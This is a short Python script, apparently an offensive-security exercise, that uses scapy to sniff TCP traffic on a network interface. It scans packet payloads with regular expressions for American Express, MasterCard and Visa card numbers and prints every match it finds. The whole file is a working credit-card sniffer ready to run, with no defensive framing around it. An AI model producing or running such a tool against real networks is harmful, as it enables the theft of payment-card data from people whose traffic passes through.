#!/usr/bin/python
# -*- coding: utf-8 -*-
import re
import optparse
from scapy.all import sniff, conf


def print_cc(pkt):
    raw = pkt.sprintf('%Raw.load%')
    america_RE = re.findall('3[47][0-9]{13}', raw)
    master_RE = re.findall('5[1-5][0-9]{14}', raw)
    visa_RE = re.findall('4[0-9]{12}(?:[0-9]{3})?', raw)

    if america_RE:
        print('[+] Found American Express Card: {}'.format(america_RE[0]))
    if master_RE:
        print('[+] Found MasterCard Card: {}'.format(master_RE[0]))
    if visa_RE:
        print('[+] Found Visa Card: {}'.format(visa_RE[0]))


if __name__ == '__main__':
    parser = optparse.OptionParser('usage %prog -i <interface>')
    parser.add_option('-i', dest='interface', type='string', help='specify interface to listen on')
    (options, args) = parser.parse_args()

    if not options.interface:
        print(parser.usage)
        exit(0)

    conf.iface = options.interface

    try:
        print('[*] Starting Credit Card Sniffer...')
        sniff(filter='tcp', prn=print_cc, store=0)

    except KeyboardInterrupt:
        exit(0)
